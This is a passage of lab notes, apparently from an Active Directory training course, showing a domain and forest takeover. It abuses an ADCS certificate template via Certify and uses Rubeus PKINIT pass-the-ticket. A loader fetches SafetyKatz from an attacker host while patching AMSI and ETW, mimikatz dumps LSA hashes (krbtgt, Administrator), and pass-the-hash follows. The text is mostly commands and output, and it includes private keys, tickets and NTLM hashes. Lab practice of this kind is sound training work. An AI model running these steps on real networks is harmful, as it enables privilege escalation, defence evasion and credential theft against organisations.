LcMRieHqa9o5FT1U/3uTwJkMYtS9/j0GAtzt5/EjD0IWIz2N+fkc+f7Bz+vRScPis8Wt2cIWXy0MEjUMHYyjW71Z2RYYo+iV7SRmtD5m9m3UP797emkFgk5WHC2n6jxT+8cGKPj8oVTjcKIv12bYn2WQ4Gyjl+J1eq6T6JDQay8JoX70Ya4PhrmSyFW+VKWWlRalpi2MJlMcDJ0A9iCaEeVkSev5Q5OKIjV4Ii046sEz4XQDpkPciGQ1Tx9ns3miYnIg9ml/o9DMbWsjYmeFPcP+cCgFJGQslFqkHfSOlzakmVQotuko1N/skkZUA2n0cKwr/9ujgeowgeegAwIBAKKB3wSB3H2B2TCB1qCB0zCB0DCBzaAbMBmgAwIBF6ESBBAW1daEY6IvDcRsc3vlP2FboRMbEVVTLlRFQ0hDT1JQLkxPQ0FMohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQOEAAKURGA8yMDIzMDIyMjE5MDMzMFqmERgPMjAyMzAyMjMwNTAzMzBapxEYDzIwMjMwMzAxMTkwMzMwWqgTGxFVUy5URUNIQ09SUC5MT0NBTKkmMCSgAwIBAqEdMBsbBmtyYnRndBsRdXMudGVjaGNvcnAubG9jYWw=
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/us.techcorp.local
  ServiceRealm             :  US.TECHCORP.LOCAL
  UserName                 :  Administrator
  UserRealm                :  US.TECHCORP.LOCAL
  StartTime                :  2/22/2023 11:03:30 AM
  EndTime                  :  2/22/2023 9:03:30 PM
  RenewTill                :  3/1/2023 11:03:30 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  FtXWhGOiLw3EbHN75T9hWw==
  ASREP (key)              :  69A3667CEE956F4B563FF10ADEF27060

```

Validate:

```
C:\Windows\system32>klist

Current LogonId is 0:0x184bfdc

Cached Tickets: (3)

#0>     Client: Administrator @ US.TECHCORP.LOCAL
        Server: krbtgt/US.TECHCORP.LOCAL @ US.TECHCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 2/22/2023 11:05:03 (local)
        End Time:   2/22/2023 21:03:30 (local)
        Renew Time: 3/1/2023 11:03:30 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x2 -> DELEGATION
        Kdc Called: US-DC.us.techcorp.local

#1>     Client: Administrator @ US.TECHCORP.LOCAL
        Server: krbtgt/us.techcorp.local @ US.TECHCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/22/2023 11:03:30 (local)
        End Time:   2/22/2023 21:03:30 (local)
        Renew Time: 3/1/2023 11:03:30 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

#2>     Client: Administrator @ US.TECHCORP.LOCAL
        Server: HTTP/us-dc @ US.TECHCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 2/22/2023 11:05:03 (local)
        End Time:   2/22/2023 21:03:30 (local)
        Renew Time: 3/1/2023 11:03:30 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: US-DC.us.techcorp.local

C:\Windows\system32>winrs -r:us-dc cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>hostname
hostname
US-DC

C:\Users\Administrator>whoami
whoami
us\administrator
```

The Same procedure for Enterprise ADmin:

Obtain Enterprise administrator pfx request:
```
C:\AD\Tools\Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
```
```
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : US\studentuser17
[*] No subject name specified, using current context as subject.

[*] Template                : ForAdminsofPrivilegedAccessWorkstations
[*] Subject                 : CN=studentuser17, CN=Users, DC=us, DC=techcorp, DC=local
[*] AltName                 : Administrator

[*] Certificate Authority   : Techcorp-DC.techcorp.local\TECHCORP-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 32

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAtMOFjU18zXaLeURgdSP0wEaxvsjQOlMEnwRd7A4iYN+jj2P+
viQIRped9MfOlkjA2eBTSWBvEgkSiUIxePkBptKDh5l1l8oAnG9kAXVU8kew7OIb
uhSPrgDu5Nld9uwfa3kLjrKqulCEJQ0hQb+vqJKwH9GnQJi0CW4bhvBgEyPvdSGZ
LVjDcFTjs4b++N7l6EMrf94DkZlVukEch0SfVGLJ548QvGfrhJhhphzj918ZqZk6
YSSsQv3S8hrWvzl21uZUAGgNPij/J2tdWwkmBzdIiIgVyjjWggl2XqCnKQ5KDSAs
Z6Wfq9BiybGsopDejeAzbgzNTEeHF92mGYmFFQIDAQABAoIBABsUd3t1sk6thbOD
FNg3rMDpVlN4jglOypBv/QoSDABrQHuIxW8CwuKgcB9tl3tYJtv9CT0i30DabxZ0
/ihbVW4Cd4Xm7YDx2CmXXmoBg9pP9ydlsDWuQuAUb7WFAtitAv/8wEh+Z6lFyqYq
U2MgLlaYsx3xMJcyyTXocuNCO4JiTVEmOtleXaVsWxUV1NOurvaquYszKitDx8HE
8j8Lc2l1rUPO8Lq1x9ipWk1UVUICqBfJRv5DEMammy94qVKB5d3vjS/Jz7R5gvdJ
LLk9VA+LFHOB8w6RPA/DcFDhO8j4RaG5g/0r4VSfoASSYU7Ywf2xhtWuq90InkZR
Q3C+/zkCgYEA0WxOkxuTX1CZDkytbXXayHvqZOaYT31VIhYVL3Wg4ytjHyCSCFMs
LThsW+EqDlYwNgvbYVJ5iRxDNVPMkTlwwUG1F+JSWMUn24CYk1Nhs+qlMJ0aALAL
bZ6cLeSOli60vunmTqPMSI5ZSoODJklFnkypydU5v4e4/cw/zqbrxiMCgYEA3Pd4
cNRBbWl49xrK6rMO5Jj+mr5HmOX1lhxOB/pjlGYWzWrwm3sOGS6SeG1tASpJELav
bzTkbBAqHWG2ZIVVw01l7aZ7GJdthQufvCW+JhuM05bIE7ufmZHTmPycjpmPPczx
BXwYYB+uxfpLXcwFMWFmsFTwbPKXhiRcPovYT2cCgYEAvzflhuzm42D0X9ojgI7b
9bMvknH7IJmP4k/HiE4fWU2EdCeJL5DCBYg/aKVvgSexXaf16CcmUcs8krSxVOjd
y5fzgptkFSnv+rywk9TOoTjfHERWOcqEpNLuR/kpOHftEWUApU1qedWAMklittKw
fpoBbgkDcZ67iwG0QTyoi4ECgYEAiHTrFAKARSkVYsRQ+4+IavNwh+9qF6ord4AT
UCn4xPQmsMSRwfLEShjQqz4oSsfqR0AKJwrq5TE2UN6+3GTbCbkKcTCWZCFfqQH8
qxxDyRTKawB6nnUHorbDjX6yz/1U0D13uoNgKjxmmixvzoTn0A7uc4aA00cc++II
dTe3ZZECgYAxvcxqw09oN5788qBlBvFi4QXTSO7pjcPA/PnGiAg9eCJsF6fUJq3L
oq57lK1B2nSEY66LEybIXEX5VJS9+IBNxhDeNobmiMwpiOZuIYHDJRZbSL0yamka
Eg4V9GFf3eL+FLQxVuSIgG5tfEZ2OZBjKx2In9wTD03RRXn0dmGckg==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGSDCCBTCgAwIBAgITdwAAACB+WTs9vreLAgAAAAAAIDANBgkqhkiG9w0BAQsF
ADBKMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGDAWBgoJkiaJk/IsZAEZFgh0ZWNo
Y29ycDEXMBUGA1UEAxMOVEVDSENPUlAtREMtQ0EwHhcNMjMwMjIyMTkyMzI4WhcN
MjQwMjIyMTkyMzI4WjBtMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGDAWBgoJkiaJ
k/IsZAEZFgh0ZWNoY29ycDESMBAGCgmSJomT8ixkARkWAnVzMQ4wDAYDVQQDEwVV
c2VyczEWMBQGA1UEAxMNc3R1ZGVudHVzZXIxNzCCASIwDQYJKoZIhvcNAQEBBQAD
ggEPADCCAQoCggEBALTDhY1NfM12i3lEYHUj9MBGsb7I0DpTBJ8EXewOImDfo49j
/r4kCEaXnfTHzpZIwNngU0lgbxIJEolCMXj5AabSg4eZdZfKAJxvZAF1VPJHsOzi
G7oUj64A7uTZXfbsH2t5C46yqrpQhCUNIUG/r6iSsB/Rp0CYtAluG4bwYBMj73Uh
mS1Yw3BU47OG/vje5ehDK3/eA5GZVbpBHIdEn1RiyeePELxn64SYYaYc4/dfGamZ
OmEkrEL90vIa1r85dtbmVABoDT4o/ydrXVsJJgc3SIiIFco41oIJdl6gpykOSg0g
LGeln6vQYsmxrKKQ3o3gM24MzUxHhxfdphmJhRUCAwEAAaOCAwIwggL+MD4GCSsG
AQQBgjcVBwQxMC8GJysGAQQBgjcVCIW5wzuGgYcDg5WPEIKezyOD0cIbgQCE3O12
ho3hJQIBZAIBCzApBgNVHSUEIjAgBggrBgEFBQcDAgYIKwYBBQUHAwQGCisGAQQB
gjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcVCgQoMCYwCgYIKwYBBQUH
AwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkqhkiG9w0BCQ8ENzA1MA4G
CCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYFKw4DAgcwCgYIKoZIhvcN
AwcwHQYDVR0OBBYEFGKeV5/bUkhL/sUFbERNrLKRsxX2MCgGA1UdEQQhMB+gHQYK
KwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1UdIwQYMBaAFM4YvtTaG9ov
MSEIc+2cFhORAO+RMIHTBgNVHR8EgcswgcgwgcWggcKggb+GgbxsZGFwOi8vL0NO
PVRFQ0hDT1JQLURDLUNBLENOPVRlY2hjb3JwLURDLENOPUNEUCxDTj1QdWJsaWMl
MjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERD
PXRlY2hjb3JwLERDPWxvY2FsP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBwwYIKwYBBQUHAQEE
gbYwgbMwgbAGCCsGAQUFBzAChoGjbGRhcDovLy9DTj1URUNIQ09SUC1EQy1DQSxD
Tj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049
Q29uZmlndXJhdGlvbixEQz10ZWNoY29ycCxEQz1sb2NhbD9jQUNlcnRpZmljYXRl
P2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG
9w0BAQsFAAOCAQEAJOxlCtcZW3kSkrJrbsbS6gdIxTyJLkg5NU79EI5VWP5j89Jz
6I+2YNReZNC3zbRws3upwpdTx+vWf07HxmpDZ7GjUsW1+SsE/t/7rQ8mXVlN8anf
C7BsQCkBhCQsW/QT5R5TWd7WKLNbAbgvLuvXUvpqjbofYsi5vM0a8LVqo5OE40Yq
nA9tOCnMycKBqBBu7f5CRqsZ74I7+CaJACAzLxYlivDaShpQn69ja2ByHUn3Go4X
RzQvnZyAUSgpaamDNr3Rv2pKOdP/LXDxudcpFs6mJArxoiJlHz2jKGRchdwAPb8O
ru3bCxPteigbzmvqpL5xMMzHA7m1VOxDZ5lTWg==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:14.5427698

```
C:\Users\studentuser17>C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\certEA.perm -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\EA.pfx
WARNING: can't open config file: /usr/local/ssl/openssl.cnf
Enter Export Password:
Verifying - Enter Export Password:
unable to write 'random state'


```
C:\Users\studentuser17>C:\AD\Tools\Rubeus.exe asktgt /user:techcorp.local\Administrator /dc:techcorp-dc.techcorp.local /certificate:C:\AD\EA.pfx /password:SecretPass@123 /nowrap /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=studentuser17, CN=Users, DC=us, DC=techcorp, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'techcorp.local\Administrator'
[*] Using domain controller: 192.168.1.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/techcorp.local
  ServiceRealm             :  TECHCORP.LOCAL
  UserName                 :  Administrator
  UserRealm                :  TECHCORP.LOCAL
  StartTime                :  2/22/2023 11:38:46 AM
  EndTime                  :  2/22/2023 9:38:46 PM
  RenewTill                :  3/1/2023 11:38:46 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  uc1Fd9swPYvbrVu6lJgqYw==
  ASREP (key)              :  C87F05FAF09784B2001FE7E3FAA49E97

```

Enterprise admin Administrator validation on parent DC techcorp.local:

```
C:\Users\studentuser17>winrs -r:techcorp-dc cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>hostname
hostname
Techcorp-DC

C:\Users\Administrator>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 3:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::aca0:24e4:b833:6648%5
   IPv4 Address. . . . . . . . . . . : 192.168.1.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.1.254

C:\Users\Administrator>whoami
whoami
techcorp\administrator
```

Dump LSA data From techcorp.local:

```
PS C:\Users\Administrator> C:\Users\Administrator\Loader.exe -path http://192.168.100.17:8989/SafetyKatz.exe
C:\Users\Administrator\Loader.exe -path http://192.168.100.17:8989/SafetyKatz.exe
[+] Successfully unhooked ETW!
[+] Successfully patched AMSI!
[+] URL/PATH : http://192.168.100.17:8989/SafetyKatz.exe Arguments :

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # -path
ERROR mimikatz_doLocal ; "-path" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz(commandline) # http://192.168.100.17:8989/SafetyKatz.exe
ERROR mimikatz_doLocal ; "http://192.168.100.17:8989/SafetyKatz.exe" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::lsa /patch
Domain : TECHCORP / S-1-5-21-2781415573-3701854478-2406986946

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : bc4cf9b751d196c4b6e1a2ba923ef33f

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 7735b8be1edda5deea6bfbacb7f2c3e7

RID  : 00000450 (1104)
User : MSOL_16fb75d0227d
LM   :
NTLM : c1db8cdcb7a89f56dd00b77e384c2c9c

RID  : 00000464 (1124)
User : $431000-R3GTAO0291F9
LM   :
NTLM :

RID  : 00000465 (1125)
User : SM_6fcd6ac55a6146a0a
LM   :
NTLM :

RID  : 00000466 (1126)
User : SM_154a18cd4a8e48f09
LM   :
NTLM :

RID  : 00000467 (1127)
User : SM_01a48ed0a28c423d9
LM   :
NTLM :

RID  : 00000468 (1128)
User : SM_37c4dd3af61044398
LM   :
NTLM :

RID  : 00000469 (1129)
User : SM_8b0a3d48bd2541249
LM   :
NTLM :

RID  : 0000046a (1130)
User : SM_8bf409db7e874ebe9
LM   :
NTLM :

RID  : 0000046b (1131)
User : SM_73d4ee9dc8674c898
LM   :
NTLM :

RID  : 0000046c (1132)
User : SM_eca5036b49c740608
LM   :
NTLM :

RID  : 0000046d (1133)
User : SM_309ad2430f0b4251b
LM   :
NTLM :

RID  : 00000472 (1138)
User : privuser
LM   :
NTLM : 6f179c10849d6a997cbe8a618868c108

RID  : 00000474 (1140)
User : testuser
LM   :
NTLM : e774a7974dc0de4c0019c28e4c55f8c8

RID  : 000003e8 (1000)
User : TECHCORP-DC$
LM   :
NTLM : bf873f681eac2a97ec7e625c47dbb9db

RID  : 00000473 (1139)
User : EMPTEST$
LM   :
NTLM : 653af537f77a28855ab9160dfe673b9f

RID  : 0000044f (1103)
User : US$
LM   :
NTLM : 7e3d15d82449d2a1cc2cef256835285d

RID  : 00000470 (1136)
User : USVENDOR$
LM   :
NTLM : c1929ef375eac9bb7071cc40db98b491

RID  : 00000471 (1137)
User : BASTION$
LM   :
NTLM : f186a027c59972382ebb051ff49decd4
```



Access to DC techcorp-dc.techcorp.local with ntlm using pass the hash with Amdinistrator user:

```

Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>C:\AD\Tools\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /user:Administrator /domain:techcorp.local /ntlm:bc4cf9b751d196c4b6e1a2ba923ef33f /run:cmd
user    : Administrator
domain  : techcorp.local
program : cmd
impers. : no
NTLM    : bc4cf9b751d196c4b6e1a2ba923ef33f
  |  PID  704
  |  TID  5524
  |  LSA Process is now R/W
  |  LUID 0 ; 55849160 (00000000:035430c8)
  \_ msv1_0   - data copy @ 000002325CD3CF80 : OK !
  \_ kerberos - data copy @ 000002325D06DD48
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 000002325C6E4C28 (32) -> null

```

```
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>whoami
whoami
techcorp\administrator
```

Get Domain:
```
PS C:\Users\Administrator> Get-ADDOmain
Get-ADDOmain


AllowedDNSSuffixes                 : {}
ChildDomains                       : {us.techcorp.local}
ComputersContainer                 : CN=Computers,DC=techcorp,DC=local
DeletedObjectsContainer            : CN=Deleted Objects,DC=techcorp,DC=local
DistinguishedName                  : DC=techcorp,DC=local
DNSRoot                            : techcorp.local
DomainControllersContainer         : OU=Domain Controllers,DC=techcorp,DC=local
DomainMode                         : Windows2016Domain
DomainSID                          : S-1-5-21-2781415573-3701854478-2406986946
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=techcorp,DC=local
Forest                             : techcorp.local
InfrastructureMaster               : Techcorp-DC.techcorp.local
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=techcorp,DC=lo
                                     cal}
LostAndFoundContainer              : CN=LostAndFound,DC=techcorp,DC=local
ManagedBy                          :
Name                               : techcorp
NetBIOSName                        : TECHCORP
ObjectClass                        : domainDNS
ObjectGUID                         : 5e4e997a-befa-4c9d-8153-4ed1b11b6818
ParentDomain                       :
PDCEmulator                        : Techcorp-DC.techcorp.local
PublicKeyRequiredPasswordRolling   : True
QuotasContainer                    : CN=NTDS Quotas,DC=techcorp,DC=local
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {Techcorp-DC.techcorp.local}
RIDMaster                          : Techcorp-DC.techcorp.local
SubordinateReferences              : {DC=us,DC=techcorp,DC=local, DC=ForestDnsZones,DC=techcorp,DC=local,
                                     DC=DomainDnsZones,DC=techcorp,DC=local, CN=Configuration,DC=techcorp,DC=local}
SystemsContainer                   : CN=System,DC=techcorp,DC=local
UsersContainer                     : CN=Users,DC=techcorp,DC=local
```
